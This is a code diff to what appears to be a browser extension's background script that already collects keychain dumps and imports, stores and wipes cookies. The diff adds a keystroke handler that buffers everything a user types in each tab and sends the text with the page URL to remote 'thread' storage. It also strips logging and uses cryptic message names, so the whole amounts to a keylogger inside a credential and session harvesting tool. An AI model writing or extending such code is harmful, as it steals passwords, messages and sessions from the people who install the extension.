@@ -1,12 +1,13 @@
 import {
+    thread_action_typing_add_entry,
     thread_add_entry,
     thread_cookie_store_set,
     thread_keychain_add_entry,
     thread_xhrstream_add_entry,
 } from './lib/util/datist';
-import { CookieStore, KeychainEntry, KeychainPayload } from './lib/types';
+import { CookieStore, KeychainEntry, KeychainPayload, ThreadActionTypingEntry } from './lib/types';
 
-const get_ids = async () => {
+const get_ids = async (): Promise<{ user_id: string, thread_id: string } | null> => {
     const { user_id, thread_id } = await chrome.storage.sync.get([
         'user_id',
         'thread_id',
@@ -61,18 +62,14 @@ chrome.runtime.onStartup.addListener(async () => {
 });
 // a message from an offscreen document every 20 second resets the inactivity timer
 chrome.runtime.onMessage.addListener(msg => {
-    if (msg.keepAlive) {
-        console.log('keepAlive');
-    }
+    if (msg.keepAlive) {}
 });
 
 chrome.runtime.onInstalled.addListener(async () => {
-    const uuid = await ensure_user_uuid();
-
-    console.log('installed', uuid);
+    await ensure_user_uuid();
 });
 
-type Message = {
+type KcMessage = {
     type: 'dump';
     data: KeychainPayload,
 }
@@ -121,7 +118,7 @@ const check_dump_changed_for_url =
     };
 
 const process_utkce = async (
-    msg: Message['data'],
+    msg: KcMessage['data'],
     url: string,
 ) => {
     const origin = new URL(url).origin;
@@ -485,10 +482,10 @@ const wipe_cookie_stores = async () => {
             chrome.cookies.remove({
                 url: cookie.url,
                 name: cookie.name!,
-            })
+            });
         }),
     );
-}
+};
 
 globalThis.import_tc = async (
     dump: chrome.cookies.Cookie[],
@@ -568,6 +565,95 @@ const buildUrl = (
     return `http${ secure ? 's' : '' }://${ domain }${ path }`;
 };
 
+type ActionKeydown = {
+    readonly code: string;
+    readonly ctrlKey: boolean;
+    readonly key: string;
+    readonly metaKey: boolean;
+    readonly shiftKey: boolean;
+};
+
+class ActionKeydownHandler {
+    private action_kd_timer: number | null = null;
+    private action_kd_buffer: string = '';
+    private action_kd_ctx: chrome.runtime.MessageSender | null = null;
+
+    async commit() {
+        if (this.action_kd_timer) {
+            clearTimeout(this.action_kd_timer);
+        }
+
+        if (!this.action_kd_timer || !this.action_kd_ctx || !this.action_kd_buffer) {
+            return;
+        }
+
+        const buffer = this.action_kd_buffer;
+        const ctx = this.action_kd_ctx;
+
+        this.action_kd_timer = null;
+        this.action_kd_buffer = '';
+        this.action_kd_ctx = null;
+
+        const ids = await get_ids();
+
+        if (ids === null) {
+            return;
+        }
+
+        try {
+            const entry: ThreadActionTypingEntry = {
+                url: ctx.url!,
+                data: {
+                    text: buffer,
+                },
+            };
+
+            await thread_action_typing_add_entry(
+                ids.user_id!,
+                ids.thread_id!,
+                entry,
+            );
+        } catch (e) {}
+    }
+
+    async handle_action(
+        sender: chrome.runtime.MessageSender,
+        msg: ActionKeydown,
+    ) {
+        if (this.action_kd_timer) {
+            clearTimeout(this.action_kd_timer);
+        }
+
+        if (
+            this.action_kd_ctx
+            && this.action_kd_ctx.tab
+            && sender.tab
+            && this.action_kd_ctx.tab.id !== sender.tab.id
+        ) {
+            try { await this.commit(); } catch (e) {}
+        }
+
+        this.action_kd_timer = setTimeout(() => {
+            this.commit();
+        }, 5000) as any as number;
+
+        if (msg.key === 'Enter') {
+            try { await this.commit(); } catch (e) {}
+            return;
+        }
+
+        if (msg.key === 'Backspace') {
+            this.action_kd_buffer = this.action_kd_buffer.slice(0, -1);
+        } else {
+            this.action_kd_buffer += msg.key;
+        }
+
+        this.action_kd_ctx = sender;
+    }
+}
+
+const action_kd_handler = new ActionKeydownHandler();
+
 chrome.runtime.onMessage.addListener(async (
     request,
     sender,
@@ -581,9 +667,20 @@ chrome.runtime.onMessage.addListener(async (
 
     if (request.type === 'xlrd_exp_req' && request.data) {
         await process_utkce(
-            request.data as Message['data'],
+            request.data as KcMessage['data'],
             sender.url,
         );
+    }
+
+    if (request.type === 'xlrd_act_kd' && request.data) {
+        await action_kd_handler.handle_action(
+            sender,
+            request.data as ActionKeydown,
+        );
+    }
+
+    if (request.type === 'xlrd_act_kd_commit') {
+        await action_kd_handler.commit();
     }
 
     if (request.type == 'xlrd_exp_checkin_ack') {
